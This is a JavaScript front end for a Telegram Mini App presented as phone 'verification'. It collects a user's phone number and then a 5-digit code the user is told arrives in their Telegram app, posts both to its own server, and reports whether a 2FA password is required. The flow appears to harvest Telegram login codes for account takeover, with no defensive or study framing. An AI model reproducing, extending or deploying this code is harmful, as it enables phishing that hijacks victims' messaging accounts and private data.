document.addEventListener('DOMContentLoaded', function () {
    const tg = window.Telegram.WebApp;
    const phoneSection = document.getElementById('phone-section');
    const otpSection = document.getElementById('otp-section');
    const phoneInput = document.getElementById('phone-input');
    const sendOtpBtn = document.getElementById('send-otp-btn');
    const otpBoxes = document.querySelectorAll('.otp-box');
    const keys = document.querySelectorAll('.key');
    const verifyBtn = document.getElementById('verify-btn');

    // Same server that serves this page — no CORS issue
    const SERVER_URL = '';

    let currentIndex = 0;
    let userPhone = '';

    const userId = tg.initDataUnsafe?.user?.id || 'user_' + Date.now();

    tg.ready();
    tg.expand();

    // Works on ALL versions
    function showAlert(msg) {
        alert(msg);
    }

    // ── Phone Step ───────────────────────────────────────────────────────────
    sendOtpBtn.addEventListener('click', async function () {
        const phone = phoneInput.value.trim();

        if (phone.length < 10) {
            showAlert('Please enter a valid phone number!');
            return;
        }

        userPhone = phone;
        sendOtpBtn.disabled = true;
        sendOtpBtn.textContent = 'Sending...';

        try {
            const res = await fetch(`${SERVER_URL}/send-otp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, user_id: String(userId) })
            });

            const result = await res.json();

            if (result.success) {
                showOtpSection();
                showAlert('Code sent! Check your Telegram app.');
            } else {
                showAlert(result.message || 'Failed to send OTP.');
            }
        } catch (err) {
            showAlert('Error: ' + err.message);
        } finally {
            sendOtpBtn.disabled = false;
            sendOtpBtn.textContent = '📤 Send Verification Code';
        }
    });

    // ── OTP Section ──────────────────────────────────────────────────────────
    function showOtpSection() {
        phoneSection.style.display = 'none';
        otpSection.style.display = 'block';
        document.querySelector('.emoji-center .emoji').textContent = '🔢';
        currentIndex = 0;
        otpBoxes[0].focus();
    }

    function focusNextBox() {
        if (currentIndex < otpBoxes.length - 1) {
            currentIndex++;
            otpBoxes[currentIndex].focus();
        }
    }

    function focusPrevBox() {
        if (currentIndex > 0) {
            currentIndex--;
            otpBoxes[currentIndex].focus();
        }
    }

    function handleKeyPress(key) {
        if (key === 'backspace') {
            otpBoxes[currentIndex].value = '';
            focusPrevBox();
        } else if (!isNaN(key)) {
            otpBoxes[currentIndex].value = key;
            focusNextBox();
        }
    }

    otpBoxes.forEach((box) => {
        box.addEventListener('input', function () {
            if (this.value.length === 1) focusNextBox();
        });
        box.addEventListener('keydown', function (e) {
            if (e.key === 'Backspace' && this.value === '') focusPrevBox();
        });
    });

    keys.forEach((key) => {
        key.addEventListener('click', function () {
            handleKeyPress(this.dataset.key);
        });
    });

    // ── Verify OTP ───────────────────────────────────────────────────────────
    verifyBtn.addEventListener('click', async function () {
        const otp = Array.from(otpBoxes).map((box) => box.value).join('');

        if (otp.length !== 5) {
            showAlert('Please enter the complete 5-digit code.');
            return;
        }

        verifyBtn.disabled = true;
        verifyBtn.textContent = 'Verifying...';

        try {
            const res = await fetch(`${SERVER_URL}/verify-otp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ otp, user_id: String(userId) })
            });

            const result = await res.json();

            if (result.success) {
                if (result.twofa_required) {
                    tg.sendData('otp_verified:needs_2fa');
                } else {
                    tg.sendData('verified:success');
                }
            } else {
                showAlert(result.message || 'Incorrect code. Please try again.');
                otpBoxes.forEach((b) => (b.value = ''));
                currentIndex = 0;
                otpBoxes[0].focus();
            }
        } catch (err) {
            showAlert('Error: ' + err.message);
        } finally {
            verifyBtn.disabled = false;
            verifyBtn.textContent = '✅ Verify Code';
        }
    });
});
